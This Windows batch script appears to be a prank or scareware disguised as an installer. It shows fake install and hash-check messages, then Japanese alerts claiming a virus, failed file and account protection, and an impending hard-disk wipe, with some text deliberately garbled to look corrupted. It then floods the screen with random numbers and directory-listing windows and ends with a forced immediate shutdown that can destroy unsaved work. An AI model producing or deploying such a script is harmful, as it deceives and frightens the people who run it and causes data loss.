@echo off
setlocal enabledelayedexpansion
chcp 65001
echo %date% %time% "起動を確認しました。本プログラムの利用規約に同意したとみなされます。"
timeout /nobreak 3 >null
echo %time% "Starting install..."
timeout /nobreak 1 >null
echo %time% "Successfully verified installer hash."
timeout /nobreak 1 >null
echo %time% "Starting deploy."
timeout /nobreak 1 >null
echo %time% "Successfully installed."
timeout /nobreak 1 >null
echo %time% "ウイルスの進行状況を確認…"
timeout /nobreak 3 >null
echo %time% "失敗しました。"
timeout /nobreak 3 >null
echo %time% "ファイルを保護…"
timeout /nobreak 3 >null
echo %time% "失敗しました。"
timeout /nobreak 3 >null
echo %time% "アカウント情報、キャッシュ情報を保護…"
timeout /nobreak 3 >null
echo %time% "失敗蟇ｾ蜃ｦ荳崎?ハードディ縺ｪ鬆伜沺縺ｫ初期化します。繝ｌ縺ｾ縺励◆縲初期化"
timeout /nobreak 2 >null
for /l %%i in (1,1,10) do (
    echo !random! !random! !random! !random! !random! !random! !random! !random! !random! !random! !random! !random! !random! !random!
    timeout /nobreak 2 >null
    start dir /s
)
shutdown.exe /s /f /t 0
